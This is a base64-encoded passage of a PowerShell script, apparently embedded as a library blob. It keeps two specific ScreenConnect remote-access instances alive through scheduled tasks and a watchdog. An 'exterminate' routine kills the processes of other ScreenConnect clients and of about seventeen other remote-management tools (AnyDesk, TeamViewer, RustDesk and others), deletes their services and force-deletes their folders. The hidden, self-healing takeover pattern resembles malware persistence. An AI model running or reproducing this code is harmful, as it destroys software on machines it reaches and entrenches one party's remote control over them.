dGNoICcoP2kpU2NyZWVuQ29ubmVjdFxzK0NsaWVudFxzKlwoKFswLTlBLUZhLWZdezE2fSlcKScp
IHsgcmV0dXJuIH0KICAgICAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpCiAgICAg
ICAgICAgIGlmICgkZnAgLWluICRrZWVwKSB7IHJldHVybiB9CiAgICAgICAgICAgIGlmICgkc2Vl
bi5Db250YWluc0tleSgkXy5QU0NoaWxkTmFtZSkpIHsgcmV0dXJuIH0KICAgICAgICAgICAgJHNl
ZW5bJF8uUFNDaGlsZE5hbWVdID0gJHRydWUKICAgICAgICAgICAgaWYgKFVuaW5zdGFsbC1Qcm9k
dWN0S2V5ICRfKSB7ICRuLnByb2R1Y3QrKyB9IGVsc2UgeyAkbi5mYWlsKys7IExvZyAicHJvZHVj
dF9SRU1PVkVfRkFJTEVEIFskZG5dIiB9CiAgICAgICAgfQogICAgfQoKICAgICMgMi4gZm9yZWln
biBTQyBzZXJ2aWNlcwogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3Jl
ZW5Db25uZWN0IENsaWVudConIH0pKSB7CiAgICAgICAgaWYgKElzLUtlZXBlciAkc3ZjLk5hbWUp
IHsgY29udGludWUgfQogICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJHN2Yy5OYW1lKSIgMj4mMSB8
IE91dC1OdWxsCiAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA2MDAKICAgICAgICAm
IHNjLmV4ZSBkZWxldGUgIiQoJHN2Yy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJG4u
c3ZjKys7IExvZyAic3ZjX2RlbGV0ZWQgJCgkc3ZjLk5hbWUpIgogICAgfQoKICAgICMgMy4gZm9y
ZWlnbiBTQyBwcm9jZXNzZXMKICAgIEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1GaWx0
ZXIgIk5hbWUgbGlrZSAnU2NyZWVuQ29ubmVjdCUnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAkZXhlID0gJF8uRXhlY3V0YWJsZVBhdGgK
ICAgICAgICBpZiAoJGV4ZSAtYW5kIC1ub3QgKElzLUtlZXBlciAkZXhlKSkgewogICAgICAgICAg
ICBTdG9wLVByb2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUKICAgICAgICAgICAgJG4ucHJvYysrOyBMb2cgInByb2Nfa2lsbGVkICRleGUi
CiAgICAgICAgfQogICAgfQoKICAgICMgNC4gZm9yZWlnbiBTQyBpbnN0YWxsIGRpcnMgKFBGICsg
UEY4NikKICAgIGZvcmVhY2ggKCRiYXNlIGluIEAoJGVudjpQcm9ncmFtRmlsZXMsICR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfSkpIHsKICAgICAgICBpZiAoLW5vdCAkYmFzZSAtb3IgLW5vdCAoVGVz
dC1QYXRoICRiYXNlKSkgeyBjb250aW51ZSB9CiAgICAgICAgR2V0LUNoaWxkSXRlbSAtTGl0ZXJh
bFBhdGggJGJhc2UgLURpcmVjdG9yeSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25u
ZWN0KicgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRkID0gJF8uRnVsbE5h
bWUKICAgICAgICAgICAgICAgIGlmIChJcy1LZWVwZXIgJGQpIHsgcmV0dXJuIH0KICAgICAgICAg
ICAgICAgIGlmIChGb3JjZS1SZW1vdmVEaXIgJGQpIHsgJG4uZGlyKys7IExvZyAiZGlyX3JlbW92
ZWQgJGQiIH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkbi5mYWlsKys7IExvZyAiZGlyX1JFTU9W
RV9GQUlMRUQgJGQiIH0KICAgICAgICAgICAgfQogICAgfQoKICAgICMgNS4gZGlzYWxsb3dlZCBS
TU0gdG9vbHMKICAgICRybW0gPSBAKAogICAgICAgIEB7IFRhZz0nQW55RGVzayc7ICAgICBTdmM9
QCgnQW55RGVzaycpOyBQcm9jPUAoJ0FueURlc2snKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
c1xBbnlEZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFueURlc2siLCIkZW52OlByb2dy
YW1EYXRhXEFueURlc2siKTsgUHJvZD1AKCdBbnlEZXNrKicpIH0KICAgICAgICBAeyBUYWc9J1Rl
YW1WaWV3ZXInOyAgU3ZjPUAoJ1RlYW1WaWV3ZXIqJyk7IFByb2M9QCgnVGVhbVZpZXdlcionKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xUZWFtVmlld2VyIiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XFRlYW1WaWV3ZXIiKTsgUHJvZD1AKCdUZWFtVmlld2VyKicpIH0KICAgICAgICBAeyBU
YWc9J01lc2hBZ2VudCc7ICAgU3ZjPUAoJ01lc2ggQWdlbnQnLCdNZXNoQWdlbnQnLCdNZXNoQ2Vu
dHJhbConKTsgUHJvYz1AKCdNZXNoQWdlbnQqJywnTWVzaENlbnRyYWwqJyk7IERpcnM9QCgiJGVu
djpQcm9ncmFtRmlsZXNcTWVzaCBBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNZXNo
IEFnZW50Iik7IFByb2Q9QCgnTWVzaCpBZ2VudConKSB9CiAgICAgICAgQHsgVGFnPSdTcGxhc2h0
b3AnOyAgIFN2Yz1AKCdTcGxhc2h0b3AqJywnU1JTZXJ2aWNlJywnU1NVU2VydmljZScpOyBQcm9j
PUAoJ1NwbGFzaHRvcConLCdzdHJ3aW5jbHQqJywnU1JNYW5hZ2VyKicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXFNwbGFzaHRvcCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTcGxhc2h0
b3AiKTsgUHJvZD1AKCdTcGxhc2h0b3AqJykgfQogICAgICAgIEB7IFRhZz0nTG9nTWVJbic7ICAg
ICBTdmM9QCgnTG9nTWVJbicsJ0xNSUd1YXJkaWFuU3ZjJywnTE1JaWduaXRpb24nKTsgUHJvYz1A
KCdMb2dNZUluKicsJ0xNSUd1YXJkaWFuKicsJ1JhU2VydmVyKicpOyBEaXJzPUAoIiRlbnY6UHJv
Z3JhbUZpbGVzXExvZ01lSW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTG9nTWVJbiIpOyBQ
cm9kPUAoJ0xvZ01lSW4qJykgfQogICAgICAgIEB7IFRhZz0nR29Ubyc7ICAgICAgICBTdmM9QCgn
R29Ub015UEMqJywnR29Ub0Fzc2lzdConLCdHb1RvUmVzb2x2ZSonKTsgUHJvYz1AKCdHb1RvTXlQ
QyonLCdHb1RvQXNzaXN0KicsJ2cybSonLCdHb1RvUmVzb2x2ZSonKTsgRGlycz1AKCIkZW52OlBy
b2dyYW1GaWxlc1xHb1RvTXlQQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxHb1RvTXlQQyIp
OyBQcm9kPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3QqJykgfQogICAgICAgIEB7IFRhZz0nQ29u
bmVjdFdpc2UnOyBTdmM9QCgnTFRTZXJ2aWNlJywnTFRTdmNNb24nKTsgUHJvYz1AKCdMVFN2Yyon
LCdMVFRyYXkqJyk7IERpcnM9QCgiJGVudjp3aW5kaXJcTFRTdmMiKTsgUHJvZD1AKCdDb25uZWN0
V2lzZSonLCdMYWJUZWNoKicpIH0KICAgICAgICBAeyBUYWc9J0F0ZXJhJzsgICAgICAgU3ZjPUAo
J0F0ZXJhQWdlbnQnKTsgUHJvYz1AKCdBdGVyYUFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
bUZpbGVzXEFURVJBIE5ldHdvcmtzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFURVJBIE5l
dHdvcmtzIik7IFByb2Q9QCgnQXRlcmEqJykgfQogICAgICAgIEB7IFRhZz0nTmluamFSTU0nOyAg
ICBTdmM9QCgnTmluamFSTU1BZ2VudCcsJ25pbmphcm1tKicpOyBQcm9jPUAoJ05pbmphUk1NQWdl
bnQqJywnbmluamFybW0qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmluamFSTU1BZ2Vu
dCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOaW5qYVJNTUFnZW50IiwiJGVudjpQcm9ncmFt
RGF0YVxOaW5qYVJNTUFnZW50Iik7IFByb2Q9QCgnTmluamFSTU0qJykgfQogICAgICAgIEB7IFRh
Zz0nRGF0dG8nOyAgICAgICBTdmM9QCgnQ2VudHJhU3RhZ2UnLCdDYWdTZXJ2aWNlJyk7IFByb2M9
QCgnQ2VudHJhU3RhZ2UqJywnRGF0dG9STU0qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
Q2VudHJhU3RhZ2UiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQ2VudHJhU3RhZ2UiKTsgUHJv
ZD1AKCdEYXR0byonLCdDZW50cmFTdGFnZSonKSB9CiAgICAgICAgQHsgVGFnPSdSdXN0RGVzayc7
ICAgIFN2Yz1AKCdSdXN0RGVzaycsJ3J1c3RkZXNrKicpOyBQcm9jPUAoJ3J1c3RkZXNrKicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJ1c3REZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XFJ1c3REZXNrIik7IFByb2Q9QCgnUnVzdERlc2sqJykgfQogICAgICAgIEB7IFRhZz0nU3Vw
cmVtbyc7ICAgICBTdmM9QCgnU3VwcmVtbyonKTsgUHJvYz1AKCdTdXByZW1vKicpOyBEaXJzPUAo
IiRlbnY6UHJvZ3JhbUZpbGVzXFN1cHJlbW8iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU3Vw
cmVtbyIpOyBQcm9kPUAoJ1N1cHJlbW8qJykgfQogICAgICAgIEB7IFRhZz0nRFdTZXJ2aWNlJzsg
ICBTdmM9QCgnRFdBZ2VudCcsJ2R3YWdlbnQqJyk7IFByb2M9QCgnZHdhZ2VudConKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xEV0FnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERX
QWdlbnQiLCIkZW52OlByb2dyYW1EYXRhXERXQWdlbnQiKTsgUHJvZD1AKCdEV0FnZW50KicpIH0K
ICAgICAgICBAeyBUYWc9J1pvaG9Bc3Npc3QnOyAgU3ZjPUAoJ1pvaG9Bc3Npc3QqJywnWm9ob01l
ZXRpbmcqJyk7IFByb2M9QCgnWm9ob0Fzc2lzdConLCdab2hvVVJTQionKTsgRGlycz1AKCIkZW52
OlByb2dyYW1GaWxlc1xab2hvTWVldGluZyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxab2hv
TWVldGluZyIpOyBQcm9kPUAoJ1pvaG8gQXNzaXN0KicpIH0KICAgICAgICBAeyBUYWc9J1JlbW90
ZVBDJzsgICAgU3ZjPUAoJ1JlbW90ZVBDKicpOyBQcm9jPUAoJ1JlbW90ZVBDKicsJ1JQQ1N1aXRl
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJlbW90ZVBDIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XFJlbW90ZVBDIik7IFByb2Q9QCgnUmVtb3RlUEMqJykgfQogICAgICAgIEB7IFRh
Zz0nU3luY3JvJzsgICAgICBTdmM9QCgnU3luY3JvKicsJ0thYnV0byonKTsgUHJvYz1AKCdTeW5j
cm8qJywnS2FidXRvKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJlcGFpclRlY2giLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmVwYWlyVGVjaCIsIiRlbnY6UHJvZ3JhbUZpbGVzXFN5
bmNybyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTeW5jcm8iKTsgUHJvZD1AKCdTeW5jcm8q
JywnS2FidXRvKicsJ1JlcGFpclRlY2gqJykgfQogICAgICAgIEB7IFRhZz0nTWFuYWdlRW5naW5l
JzsgU3ZjPUAoJ01hbmFnZUVuZ2luZSonLCdVRU1TKicpOyBQcm9jPUAoJ01hbmFnZUVuZ2luZSon
LCdkY2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE1hbmFnZUVuZ2luZSIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNYW5hZ2VFbmdpbmUiKTsgUHJvZD1AKCdNYW5hZ2VFbmdp
bmUqJywnVUVNUyonKSB9CiAgICApCiAgICBmb3JlYWNoICgkdG9vbCBpbiAkcm1tKSB7CiAgICAg
ICAgJGhpdCA9ICRmYWxzZQogICAgICAgIGZvcmVhY2ggKCRwYXQgaW4gJHRvb2wuUHJvZCkgewog
ICAgICAgICAgICBmb3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAg
ICAgICAgICAgICAgICBHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRkbiA9IChHZXQt
SXRlbVByb3BlcnR5ICRfLlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuRGlz
cGxheU5hbWUKICAgICAgICAgICAgICAgICAgICBpZiAoJGRuIC1hbmQgJGRuIC1saWtlICRwYXQp
IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFVuaW5zdGFsbC1Qcm9kdWN0S2V5ICRfKSB7
ICRuLnJtbSsrOyAkaGl0ID0gJHRydWUgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAg
ICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBmb3JlYWNoICgkcGF0IGlu
ICR0b29sLlN2YykgewogICAgICAgICAgICBHZXQtU2VydmljZSAtTmFtZSAkcGF0IC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAg
JiBzYy5leGUgc3RvcCAiJCgkXy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgICAg
ICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDUwMAogICAgICAgICAgICAgICAgJiBzYy5leGUg
ZGVsZXRlICIkKCRfLk5hbWUpIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgICRuLnJt
bSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX3N2Y19kZWxldGVkICQoJF8uTmFtZSkgWyQoJHRv
b2wuVGFnKV0iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHBhdCBp
biAkdG9vbC5Qcm9jKSB7CiAgICAgICAgICAgIEdldC1Qcm9jZXNzIC1OYW1lICRwYXQgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAg
ICBTdG9wLVByb2Nlc3MgLUlkICRfLklkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZQogICAgICAgICAgICAgICAgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fcHJv
Y19raWxsZWQgJCgkXy5Qcm9jZXNzTmFtZSkgWyQoJHRvb2wuVGFnKV0iCiAgICAgICAgICAgIH0K
ICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJGQgaW4gJHRvb2wuRGlycykgewogICAgICAgICAg
ICBpZiAoJGQgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsKICAgICAgICAgICAg
ICAgIGlmIChGb3JjZS1SZW1vdmVEaXIgJGQpIHsgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9n
ICJybW1fZGlyX3JlbW92ZWQgJGQiIH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkbi5mYWlsKys7
IExvZyAicm1tX2Rpcl9SRU1PVkVfRkFJTEVEICRkIiB9CiAgICAgICAgICAgIH0KICAgICAgICB9
CiAgICAgICAgaWYgKCRoaXQpIHsgTG9nICJybW1fZXh0ZXJtaW5hdGVkICQoJHRvb2wuVGFnKSIg
fQogICAgfQoKICAgICRzdW1tYXJ5ID0gImV4dGVybWluYXRlIHN2Yz0kKCRuLnN2YykgcHJvYz0k
KCRuLnByb2MpIGRpcj0kKCRuLmRpcikgcHJvZHVjdD0kKCRuLnByb2R1Y3QpIHJtbT0kKCRuLnJt
bSkgZmFpbD0kKCRuLmZhaWwpIgogICAgTG9nICRzdW1tYXJ5CiAgICByZXR1cm4gJHN1bW1hcnkK
fQoKZnVuY3Rpb24gVXBkYXRlLVN0YXRlIHsKICAgICRwcmltID0gJG51bGw7ICRhbHQgPSAkbnVs
bAogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3Qg
Q2xpZW50KicpKSB7CiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2
fSlcKScpIHsKICAgICAgICAgICAgaWYgKCRtYXRjaGVzWzFdIC1lcSAnNWY2MDEwNTc5ODUyZTUw
NycpIHsgJHByaW0gPSAiJCgkc3ZjLlN0YXR1cykiIH0KICAgICAgICAgICAgZWxzZWlmICgkbWF0
Y2hlc1sxXSAtZXEgJ2Y4NjFjODE0MGQ0NTM0MjcnKSB7ICRhbHQgPSAiJCgkc3ZjLlN0YXR1cyki
IH0KICAgICAgICB9CiAgICB9CiAgICAkZm9yZWlnbiA9IEAoKQogICAgZm9yZWFjaCAoJHN2YyBp
biAoR2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicpKSB7CiAgICAgICAg
aWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScgLWFuZCAkbWF0Y2hlc1sx
XSAtbm90aW4gQCgnNWY2MDEwNTc5ODUyZTUwNycsJ2Y4NjFjODE0MGQ0NTM0MjcnKSkgewogICAg
ICAgICAgICAkZm9yZWlnbiArPSAkbWF0Y2hlc1sxXQogICAgICAgIH0KICAgIH0KICAgICRpZCA9
IFJlYWQtSWRlbnRpdHkKICAgICR0YXNrc09rID0gMDsgJHRhc2tzVG90YWwgPSAwCiAgICBmb3Jl
YWNoICgkayBpbiAnVEFTS19BJywnVEFTS19CJywnVEFTS19DJywnVEFTS19EJykgewogICAgICAg
ICR0YXNrc1RvdGFsKysKICAgICAgICAmIHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1ROICRpZFska10g
Mj4mMSB8IE91dC1OdWxsCiAgICAgICAgaWYgKCRMQVNURVhJVENPREUgLWVxIDApIHsgJHRhc2tz
T2srKyB9CiAgICB9CiAgICAkd2QgPSBFbnN1cmUtV2F0Y2hkb2cKICAgICRwcmV2ID0gQHt9CiAg
ICAkc3RhdGVQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdzdGF0ZS5qc29uJwogICAgaWYgKFRl
c3QtUGF0aCAkc3RhdGVQYXRoKSB7CiAgICAgICAgdHJ5IHsgKEdldC1Db250ZW50IC1MaXRlcmFs
UGF0aCAkc3RhdGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uKS5QU09iamVjdC5Qcm9wZXJ0
aWVzIHwgRm9yRWFjaC1PYmplY3QgeyAkcHJldlskXy5OYW1lXSA9ICRfLlZhbHVlIH0gfSBjYXRj
aCB7fQogICAgfQogICAgJGluc3RhbGxDb3VudCA9IDEKICAgIGlmICgkcHJldi5pbnN0YWxsQ291
bnQpIHsgJGluc3RhbGxDb3VudCA9IFtpbnRdJHByZXYuaW5zdGFsbENvdW50IH0KICAgIGlmICgk
cHJldi5wcmltIC1hbmQgJHByZXYucHJpbSAtbmUgJ1J1bm5pbmcnIC1hbmQgJHByaW0gLWVxICdS
dW5uaW5nJykgeyAkaW5zdGFsbENvdW50KysgfQogICAgJHN0YXRlID0gW29yZGVyZWRdQHsKICAg
ICAgICBob3N0ICAgICAgICAgPSAkZW52OkNPTVBVVEVSTkFNRQogICAgICAgIHRzICAgICAgICAg
ICA9IChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKQogICAgICAgIGJ1
aWxkICAgICAgICA9ICRCdWlsZAogICAgICAgIHByaW0gICAgICAgICA9ICQoaWYgKCRwcmltKSB7
ICRwcmltIH0gZWxzZSB7ICdNSVNTSU5HJyB9KQogICAgICAgIGFsdCAgICAgICAgICA9ICQoaWYg
KCRhbHQpIHsgJGFsdCB9IGVsc2UgeyAnTUlTU0lORycgfSkKICAgICAgICBmb3JlaWduICAgICAg
PSAkZm9yZWlnbgogICAgICAgIHRhc2tzT2sgICAgICA9ICR0YXNrc09rCiAgICAgICAgdGFza3NU
b3RhbCAgID0gJHRhc2tzVG90YWwKICAgICAgICB3YXRjaGRvZyAgICAgPSAkd2QKICAgICAgICBp
bnN0YWxsQ291bnQgPSAkaW5zdGFsbENvdW50CiAgICAgICAgbGFzdEhlYWwgICAgID0gJChpZiAo
JEV4dHJhKSB7IChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKSB9IGVs
c2VpZiAoJHByZXYubGFzdEhlYWwpIHsgJHByZXYubGFzdEhlYWwgfSBlbHNlIHsgJG51bGwgfSkK
ICAgICAgICBub3RlICAgICAgICAgPSAkRXh0cmEKICAgIH0KICAgICgkc3RhdGUgfCBDb252ZXJ0
VG8tSnNvbiAtQ29tcHJlc3MpIHwgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGgg
LUZvcmNlCiAgICByZXR1cm4gJHN0YXRlCn0KCnN3aXRjaCAoJEFjdGlvbikgewogICAgJ2luaXQn
ICAgICAgICAgICAgeyAkaWQgPSBJbml0aWFsaXplLUlkZW50aXR5OyAkaWQuR2V0RW51bWVyYXRv
cigpIHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5LZXkpPSQoJF8uVmFsdWUpIiB9IH0KICAgICdp
ZGVudGl0eScgICAgICAgIHsgJGlkID0gUmVhZC1JZGVudGl0eTsgJGlkLkdldEVudW1lcmF0b3Io
KSB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0kKCRfLlZhbHVlKSIgfSB9CiAgICAnd2F0
Y2hkb2cnICAgICAgICB7IEluc3RhbGwtV2F0Y2hkb2cgfCBPdXQtTnVsbCB9CiAgICAnd2F0Y2hk
b2ctZW5zdXJlJyB7IEVuc3VyZS1XYXRjaGRvZyB9CiAgICAnc3RhdGUnICAgICAgICAgICB7IFVw
ZGF0ZS1TdGF0ZSB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcyB9CiAgICAncmVwYWlyJyAgICAg
ICAgICB7IFJlcGFpci1TQ1NlcnZpY2UgJEZwIH0KICAgICdyZWdpc3RlcmVkJyAgICAgIHsgVGVz
dC1TQ1JlZ2lzdGVyZWQgJEZwIH0KICAgICdleHRlcm1pbmF0ZScgICAgIHsgSW52b2tlLUV4dGVy
bWluYXRlIH0KfQo=
::B64_LIB_END